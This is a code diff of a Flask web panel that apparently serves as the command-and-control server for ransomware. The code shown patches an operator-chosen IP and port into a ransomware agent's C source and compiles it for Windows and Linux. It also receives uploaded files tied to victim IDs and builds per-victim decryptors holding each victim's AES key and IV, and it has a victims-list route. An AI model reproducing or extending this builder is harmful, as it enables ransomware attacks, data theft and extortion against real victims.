@@ -5,11 +5,6 @@ from wtforms import StringField, PasswordField, SubmitField
 from wtforms.validators import DataRequired, Length
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 import os
-import uuid
-import random
-import string
-import time
-import subprocess
 from werkzeug.security import generate_password_hash, check_password_hash
 from datetime import datetime
 
@@ -165,7 +160,7 @@ def generate():
         choice = request.form['choice']
 
         # We open the code and keep all of it in a variable
-        with open('/var/www/c2/Payload/src/ransom_agent/main.c', 'r') as file:
+        with open('/var/www/c2/Payload/src/ransom_agent/template.c', 'r') as file:
             code_content = file.read()
 
         # Go in the code to found a specific line and change it by the IP/Domain + Port chosen by the user
@@ -173,13 +168,13 @@ def generate():
         ip_port_change = ip_change.replace('int port = 42956;', f'int port = {port};')
 
         # Creating a new code file and apply the changes
-        with open('/var/www/c2/Payload/src/ransom_agent/new_main.c', 'w') as file:
+        with open('/var/www/c2/Payload/src/ransom_agent/main.c', 'w') as file:
             file.write(ip_port_change)
 
         # If the user choose Windows
         if choice == 'Windows':
             # Compiling
-            command = '/usr/bin/x86_64-w64-mingw32-gcc -o /var/www/c2/Payload/src/ransom_agent/program.exe /var/www/c2/Payload/src/ransom_agent/new_main.c /var/www/c2/Payload/src/ransom_agent/files.c /var/www/c2/Payload/src/ransom_agent/encryption.c -I/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/include -I/var/www/c2/Payload/openssl-3.0.14/include  -L/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/lib -L/var/www/c2/Payload/openssl-3.0.14 -Wl,-rpath,/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/bin -lcurl -lssl -lcrypto -lws2_32 -lwsock32 -lbcrypt'
+            command = '/usr/bin/x86_64-w64-mingw32-gcc -o /var/www/c2/Payload/src/ransom_agent/program.exe /var/www/c2/Payload/src/ransom_agent/main.c /var/www/c2/Payload/src/ransom_agent/files.c /var/www/c2/Payload/src/ransom_agent/encryption.c -I/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/include -I/var/www/c2/Payload/openssl-3.0.14/include  -L/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/lib -L/var/www/c2/Payload/openssl-3.0.14 -Wl,-rpath,/var/www/c2/Payload/curl-8.8.0_2-win64-mingw/bin -lcurl -lssl -lcrypto -lws2_32 -lwsock32 -lbcrypt'
             os.system(command)
 
             # Return the executable program   
@@ -190,7 +185,7 @@ def generate():
         # If the user choose Linux
         elif choice == 'Linux':       
             # Compiling
-            command = '/usr/bin/gcc /var/www/c2/Payload/src/ransom_agent/new_main.c /var/www/c2/Payload/src/ransom_agent/files.c /var/www/c2/Payload/src/ransom_agent/encryption.c -I/usr/bin/as -lcurl -lssl -lcrypto -w -o /var/www/c2/Payload/src/ransom_agent/program -B /usr/bin/'
+            command = '/usr/bin/gcc /var/www/c2/Payload/src/ransom_agent/main.c /var/www/c2/Payload/src/ransom_agent/files.c /var/www/c2/Payload/src/ransom_agent/encryption.c -I/usr/bin/as -lcurl -lssl -lcrypto -w -o /var/www/c2/Payload/src/ransom_agent/program -B /usr/bin/'
             ok = os.system(command)
                 
             # Return the executable program  
@@ -204,10 +199,6 @@ def generate():
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
-    # If there is no file or not the id mentionned, return an error
-    if 'file' not in request.files or 'id' not in request.form:
-        return "No file selected\n", 400
-
     # Getting the file and the value of the ID
     file = request.files['file']
     id = request.form['id']
@@ -305,7 +296,7 @@ def download_decryption():
             clear_iv = fichier.read()
 
         # Open the decryption code and keep it in a variable
-        with open('decryptor/main.c', 'r') as file:
+        with open('decryptor/template.c', 'r') as file:
             code_content = file.read()
 
         # Change specific lines of the code to put the right AES Key and IV
@@ -313,20 +304,20 @@ def download_decryption():
         iv_aes_change = aes_change.replace('char* iv_string = "d9822cbd2bff813630764fa8b004904d";', f'char* iv_string = "{clear_iv}";')
 
         # Write the changes in a new file
-        with open('decryptor/new_main.c', 'w') as file:
+        with open('decryptor/main.c', 'w') as file:
             file.write(iv_aes_change)
 
         # If the user choose Windows
         if "Windows" in choice:
             # Compile and the binary program will be returned
             os.system("decryptor/compile_w.sh")
-            return send_file("decryptor/XDXDXDXDXDXD.exe", as_attachment=True)
+            return send_file("decryptor/decryptor.exe", as_attachment=True)
 
         # If the user choose Linux
         elif "Linux" in choice:
             # Compile and the exe program will be returned
             os.system("decryptor/compile.sh")
-            return send_file("decryptor/XDXDXDXDXDXD", as_attachment=True)
+            return send_file("decryptor/decryptor", as_attachment=True)
 
 # List of victims pages
 @app.route('/victims', methods=['GET', 'POST'])
